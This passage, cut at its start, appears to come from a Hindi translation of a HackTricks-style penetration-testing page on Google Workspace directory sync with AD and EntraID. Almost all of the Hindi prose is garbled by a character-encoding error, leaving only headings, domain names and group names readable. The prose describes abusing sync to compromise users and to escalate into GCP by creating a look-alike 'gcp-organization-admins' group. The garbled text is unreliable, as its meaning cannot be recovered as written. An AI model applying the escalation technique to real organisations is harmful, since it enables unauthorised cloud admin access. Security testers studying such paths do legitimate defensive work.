‡§™‡§∞ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§π‡•Å‡§Ç‡§ö ‡§µ‡§æ‡§≤‡•á ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** ‡§î‡§∞ **LDAPS** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§∏‡§Ç‡§™‡§∞‡•ç‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§™‡§§‡•ç‡§∞** ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§π‡•ã‡§Ç‡§ó‡•á‡•§
* **‡§è‡§ú‡§º‡•ç‡§Ø‡•ã‡§∞ ‡§è‡§Ç‡§ü‡•ç‡§∞‡§æ ‡§Ü‡§à‡§°‡•Ä:** ‡§á‡§∏‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§∏ **‡§è‡§ú‡§º‡•ç‡§Ø‡•ã‡§∞ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§®‡§æ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ ‡§è‡§Ç‡§ü‡•ç‡§∞‡§æ ‡§Ü‡§à‡§°‡•Ä ‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡§∞ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•à** ‡§ú‡•ã Google ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§ø‡§§ ‡§™‡•â‡§™-‡§Ö‡§™ ‡§Æ‡•á‡§Ç ‡§π‡•à, ‡§î‡§∞ Google ‡§è‡§Ç‡§ü‡•ç‡§∞‡§æ ‡§Ü‡§à‡§°‡•Ä ‡§™‡§∞ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ü‡•ã‡§ï‡§® ‡§∞‡§ñ‡•á‡§ó‡§æ‡•§

‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§∏‡§π‡•Ä ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ **Workspace ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç‡§ó‡•á, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π Workspace ‡§∏‡•á AD ‡§Ø‡§æ EntraID ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§ó‡§æ‡•§

‡§á‡§∏ ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§Ö‡§®‡•ç‡§Ø ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§ú‡•ã ‡§Ø‡§π ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡§æ:

* ‡§®‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§à‡§Æ‡•á‡§≤ ‡§≠‡•á‡§ú‡•á‡§Ç
* ‡§â‡§®‡§ï‡•á ‡§à‡§Æ‡•á‡§≤ ‡§™‡§§‡•á ‡§ï‡•ã Workspace ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§™‡§§‡•á ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§¨‡§¶‡§≤‡•á‡§Ç‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø Workspace `@hacktricks.xyz` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ EntraID ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ `@carloshacktricks.onmicrosoft.com` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã `@hacktricks.xyz` ‡§â‡§® ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§¨‡§®‡§æ‡§è ‡§ó‡§è ‡§π‡•à‡§Ç‡•§
* **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞‡•á‡§Ç**‡•§
* Workspace ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç** ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞‡•á‡§Ç (‡§Ø‡§æ ‡§∏‡§≠‡•Ä ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§¶‡•á‡§Ç)‡•§

### AD/EntraID -> Google Workspace (& GCP)

‡§Ø‡§¶‡§ø ‡§Ü‡§™ AD ‡§Ø‡§æ EntraID ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ Google Workspace ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§™‡§∞ ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§π‡•ã‡§ó‡§æ‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•ã Workspace ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ‡§â‡§®‡§ï‡•á **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** **‡§è‡§ï ‡§∏‡§Æ‡§æ‡§® ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ ‡§®‡§π‡•Ä‡§Ç**‡•§

#### ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§™‡§∞ ‡§π‡§Æ‡§≤‡§æ

‡§ú‡§¨ ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π **AD ‡§∏‡•á ‡§∏‡§≠‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§Ø‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§ï‡§ø‡§∏‡•Ä ‡§µ‡§ø‡§∂‡•á‡§∑ OU ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã** ‡§Ø‡§æ ‡§ï‡•á‡§µ‡§≤ **EntraID ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§¶‡§∏‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã** ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡§∞ ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è (‡§Ø‡§æ ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à) ‡§Ü‡§™‡§ï‡•ã ‡§™‡§π‡§≤‡•á ‡§Ø‡§π ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§ï‡•å‡§® ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§π‡•ã ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§

* ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ **AD ‡§Ø‡§æ EntraID ‡§∏‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ ‡§®‡§π‡•Ä‡§Ç**, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã **‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ**‡•§
* ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á **‡§à‡§Æ‡•á‡§≤** ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ Workspace ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§Ø‡§æ **‡§è‡§ï ‡§®‡§Ø‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§ú‡§¨ ‡§§‡§ï ‡§ï‡§ø ‡§Ø‡§π ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§® ‡§π‡•ã ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§ñ‡§æ‡§§‡§æ ‡§∏‡•á‡§ü‡§Ö‡§™ ‡§ï‡§∞‡•á‡§Ç‡•§

‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§Ü‡§™ Workspace ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§≤‡•á‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§â‡§∏‡•á ‡§ï‡•Å‡§õ **‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§¶‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç**‡•§

#### ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§™‡§∞ ‡§π‡§Æ‡§≤‡§æ

‡§Ü‡§™‡§ï‡•ã ‡§™‡§π‡§≤‡•á ‡§Ø‡§π ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§ï‡•å‡§® ‡§∏‡•á ‡§∏‡§Æ‡•Ç‡§π ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§π‡•ã ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§π‡•à ‡§ï‡§ø **‡§∏‡§≠‡•Ä** ‡§∏‡§Æ‡•Ç‡§π ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§π‡•ã ‡§∞‡§π‡•á ‡§π‡•à‡§Ç (‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø Workspace ‡§á‡§∏‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à)‡•§

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§∏‡§Æ‡•Ç‡§π ‡§î‡§∞ ‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ Workspace ‡§Æ‡•á‡§Ç ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•ã‡§Ç, **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç, ‡§µ‡•á ‡§∏‡§Æ‡•Ç‡§π ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§®‡§π‡•Ä‡§Ç ‡§¨‡§®‡§æ‡§è ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á** ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§µ‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•á ‡§∏‡§¶‡§∏‡•ç‡§Ø ‡§π‡•ã‡§Ç‡•§
{% endhint %}

‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø Azure ‡§ï‡•á ‡§ï‡•å‡§® ‡§∏‡•á ‡§∏‡§Æ‡•Ç‡§π **Workspace ‡§Ø‡§æ GCP ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§∏‡•å‡§Ç‡§™‡•á ‡§ú‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç**, ‡§§‡•ã ‡§Ü‡§™ ‡§¨‡§∏ ‡§è‡§ï ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ (‡§Ø‡§æ ‡§®‡§è ‡§¨‡§®‡§æ‡§è ‡§ó‡§è) ‡§ï‡•ã ‡§â‡§∏ ‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§â‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

Workspace ‡§Æ‡•á‡§Ç ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§π‡•à‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§∏‡§Æ‡•Ç‡§π `gcp-organization-admins@<workspace.email>` ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ GCP ‡§™‡§∞ ‡§â‡§ö‡•ç‡§ö ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§∞‡§ñ‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø, ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, EntraID ‡§∏‡•á Workspace ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® **‡§Ü‡§Ø‡§æ‡§§‡§ø‡§§ ‡§µ‡§∏‡•ç‡§§‡•Å ‡§ï‡•á ‡§°‡•ã‡§Æ‡•á‡§® ‡§ï‡•ã Workspace ‡§ï‡•á ‡§à‡§Æ‡•á‡§≤ ‡§∏‡•á ‡§¨‡§¶‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à**, ‡§§‡•ã ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§≤‡§ø‡§è EntraID ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡•Ç‡§π `gcp-organization-admins@<entraid.email>` ‡§¨‡§®‡§æ‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã‡§ó‡§æ, ‡§á‡§∏ ‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•ã‡§°‡§º‡•á‡§Ç, ‡§î‡§∞ ‡§∏‡§≠‡•Ä ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡•á‡§Ç‡•§\
**‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡§Æ‡•Ç‡§π `gcp-organization-admins@<workspace.email>` ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§ú‡§ø‡§∏‡§∏‡•á GCP ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡•á‡§Ç‡§ó‡•á‡•§**

### Google Workspace -> AD/EntraID

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø Workspace ‡§ï‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è AD ‡§Ø‡§æ EntraID ‡§™‡§∞ ‡§ï‡•á‡§µ‡§≤ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö ‡§µ‡§æ‡§≤‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, AD ‡§Ø‡§æ EntraID ‡§Æ‡•á‡§Ç ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è Google Workspace ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è **‡§Ø‡§π ‡§á‡§∏ ‡§∏‡§Æ‡§Ø ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**‡•§

‡§Æ‡•Å‡§ù‡•á ‡§Ø‡§π ‡§≠‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§™‡§§‡§æ ‡§ï‡§ø Google AD ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§Ø‡§æ EntraID ‡§ü‡•ã‡§ï‡§® ‡§ï‡•ã ‡§ï‡§π‡§æ‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ü‡§™ **‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§ï‡•á ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§™‡•Å‡§®‡§∞‡•ç‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á** (‡§µ‡•á ‡§µ‡•á‡§¨ ‡§´‡•â‡§∞‡•ç‡§Æ ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á‡§§‡•á, ‡§Ü‡§™‡§ï‡•ã ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§¶‡•á‡§®‡§æ ‡§π‡•ã‡§ó‡§æ)‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§µ‡•á‡§¨ ‡§∏‡•á ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§î‡§∞ ‡§∏‡§Æ‡•Ç‡§π‡•ã‡§Ç ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è**‡•§

